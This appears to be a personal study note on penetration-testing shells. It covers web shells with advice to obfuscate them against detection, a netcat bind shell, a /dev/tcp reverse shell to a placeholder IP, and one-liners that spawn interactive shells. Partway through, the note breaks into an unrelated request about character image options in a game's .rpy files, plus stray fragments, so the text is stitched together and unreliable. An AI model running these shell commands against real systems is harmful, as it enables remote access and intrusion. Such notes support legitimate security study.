---
MOC: "[[Offensive Security Concepts MOC]]"
---
-- --
A shell gives a user a text interface to the computer. This is a common goal of a penetration test to get greater access to the system for [[enumeration]] and [[Linux Privilege Escalation|Linux]]/[[Windows Privilege Escalation|Windows]] privilege escalation.

A web shell is a shell accessible from the browser to run commands. [Laudanum](https://github.com/jbarcia/Web-Shells/tree/master/laudanum) is a popular repository of web shells, and can be found at `/usr/share/laudanum` for Kali and Parrot OS. The [[PowerShell]] based`/usr/share/nishang/Antak-WebShell` is also useful with [[Windows]] systems. These files often need to be modified for your [[IP addresses|IPs]] and credentials. To escape detection, it is often necessary to strip comments/obfuscate the payload.

A bind shell runs on the target to listen to connections, and is much more likely to be blocked by firewalls.
```shell
# Target
$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <IP> 7777 > /tmp/f

# Local
$ nc -nv <IP> 7777
```

A reverse shell runs on the local system, and the target reaches back to the local system to connect, making it less likely to be blocked by firewalls, especially with common outbound ports. There are [many payloads](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) to create reverse shells.

```shell
# Local
$ sudo nc -lvnp 443

# Target
$ /bin/bash -l > /dev/tcp/<IP>/443 0<&1 2>&1
```

# Interactive Mode
Many shells spawned from attacks are not in interactive mode, which is important for some commands, like `sudo`, which require interactive input. There are many ways to spawn this mode, depending on the language used, which can be used to escalate privileges.

```shell
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
$ /bin/sh -i
$ perl -e 'exec "/bin/sh";'
$ ruby: exec "/bin/sh"
$ lua: os.execute('/bin/sh')
$ awk 'BEGIN {system("/bin/sh")}'
$ find . -exec /bin/sh \; -quit
$ vim -c ':!/bin/sh'
```



This change will be a bit tricky, and you may need to refer to the game code. Based on the naming style of the images, can you create options for each character that reflect the changes? For example, I would select "Cove" as the character to add, then the age/corresponding step, then event specific stuff, then slim/buff, .... That way I don't need to set the slim/buff version for each accessory, but this meta option will hold the preferences. For this, you would need to set a default version for each as well. It might be easiest to build on the logic code in some of the .rpy files and create settings for the variables, or ask me, like how the _b typically means blurry for the backgrounds. Also, some of the expressions aren't meant to stand alone (check the code) since they are just eyebrows or something.

Default parts enabled

Expressions rendered behind hair

Apple liquid glass theming?